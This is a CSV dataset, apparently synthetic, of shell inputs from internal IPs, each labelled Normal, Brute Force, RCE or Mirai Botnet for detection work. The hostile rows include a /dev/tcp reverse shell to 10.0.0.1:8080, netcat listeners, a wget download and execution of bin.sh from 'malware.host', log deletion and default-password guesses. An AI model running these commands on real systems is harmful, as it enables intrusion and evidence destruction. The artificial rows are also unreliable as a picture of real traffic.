timestamp,src_ip,input,label
2026-01-08T10:46:17.312501,192.168.1.27,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.98,nc -lvp 4444,RCE
2026-01-08T10:46:17.311501,192.168.1.177,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,id,Normal
2026-01-08T10:46:17.308503,192.168.1.12,id,Normal
2026-01-08T10:46:17.310501,192.168.1.79,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.249,id,Normal
2026-01-08T10:46:17.311501,192.168.1.109,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.76,id,Normal
2026-01-08T10:46:17.307501,192.168.1.28,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.23,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.251,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.185,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.103,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.101,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.138,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.119,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.71,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.118,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.52,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.176,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.61,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.208,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.33,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.166,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.81,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.62,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.175,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.133,id,Normal
2026-01-08T10:46:17.308503,192.168.1.191,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.109,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.239,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.34,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.174,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.173,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.213,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.156,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.40,id,Normal
2026-01-08T10:46:17.311501,192.168.1.146,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.223,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.58,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.163,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.145,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.255,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.36,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.71,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.132,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.186,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.15,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.118,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.134,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.163,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.159,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.137,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.30,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.194,id,Normal
2026-01-08T10:46:17.312501,192.168.1.222,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.311501,192.168.1.87,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.244,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.225,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.102,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.131,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.156,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.207,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.199,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.81,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.126,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.131,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.156,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.133,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.245,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.136,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.171,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.70,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.2,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.209,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.34,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.123,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.147,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.45,id,Normal
2026-01-08T10:46:17.309502,192.168.1.26,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.231,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.132,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.222,id,Normal
2026-01-08T10:46:17.308503,192.168.1.241,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.129,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.117,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.254,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.82,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.3,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.211,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.54,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.96,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.207,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.33,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.142,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.96,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.102,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.157,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.20,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.212,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.152,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.141,id,Normal
2026-01-08T10:46:17.312501,192.168.1.50,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.28,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.11,id,Normal
2026-01-08T10:46:17.306501,192.168.1.120,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.223,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.81,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.29,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.178,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.138,id,Normal
2026-01-08T10:46:17.308503,192.168.1.150,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.204,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.56,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.249,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.170,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.142,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.133,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.226,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.111,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.77,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.64,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.51,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.54,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.47,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.160,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.13,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.74,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.4,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.55,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.182,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.86,nc -lvp 4444,RCE
2026-01-08T10:46:17.306501,192.168.1.241,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.115,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.102,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.155,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.205,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.210,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.198,id,Normal
2026-01-08T10:46:17.310501,192.168.1.193,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.173,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.137,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.33,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.193,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.71,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.142,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.212,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.103,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.26,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.252,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.229,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.89,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.21,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.80,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.198,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.177,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.125,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.76,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.203,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.140,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.159,id,Normal
2026-01-08T10:46:17.309502,192.168.1.214,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.254,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.151,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.122,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.184,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.6,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.158,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.253,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.228,id,Normal
2026-01-08T10:46:17.310501,192.168.1.142,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.163,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.50,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.34,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.31,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.5,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.200,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.164,support,Brute Force
2026-01-08T10:46:17.309502,192.168.1.206,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.56,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.192,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.46,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.87,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.103,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.144,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.210,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.108,id,Normal
2026-01-08T10:46:17.310501,192.168.1.67,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.174,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.249,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.102,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.165,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.188,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.59,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.220,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.110,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.176,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.137,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.75,id,Normal
2026-01-08T10:46:17.307501,192.168.1.206,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.135,id,Normal
2026-01-08T10:46:17.306501,192.168.1.245,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.56,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.249,id,Normal
2026-01-08T10:46:17.312501,192.168.1.219,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.143,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.251,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.16,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.104,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.76,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.26,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.161,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.217,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.210,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.37,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.138,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.186,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.142,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.252,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.232,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.250,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.10,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.180,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.242,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.177,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.78,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.79,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.126,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.248,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.82,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.117,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.51,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.34,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.200,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.246,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.61,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.214,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.209,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.20,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.45,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.218,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.27,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.147,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.158,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.139,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.142,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.190,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.235,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.114,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.62,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.40,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.254,id,Normal
2026-01-08T10:46:17.306501,192.168.1.176,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.49,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.55,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.62,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.49,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.16,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.188,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.115,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.3,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.43,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.127,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.134,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.23,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.17,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.206,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.152,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.135,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.65,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.193,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.14,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.196,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.181,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.248,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.11,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.147,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.79,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.56,id,Normal
2026-01-08T10:46:17.311501,192.168.1.83,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.134,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.217,id,Normal
2026-01-08T10:46:17.311501,192.168.1.81,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.28,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.103,id,Normal
2026-01-08T10:46:17.310501,192.168.1.34,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.82,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.197,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.158,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.218,id,Normal
2026-01-08T10:46:17.308503,192.168.1.199,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.61,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.142,admin,Brute Force
2026-01-08T10:46:17.312501,192.168.1.133,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.44,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.8,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.71,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.130,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.87,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.110,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.154,nc -lvp 4444,RCE
2026-01-08T10:46:17.311501,192.168.1.97,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.15,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.174,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.233,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.165,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.24,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.196,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.123,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.209,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.149,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.211,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.248,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.255,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.125,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.93,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.15,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.244,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.4,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.128,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.8,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.142,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.163,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.35,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.75,cat /etc/issue,Normal
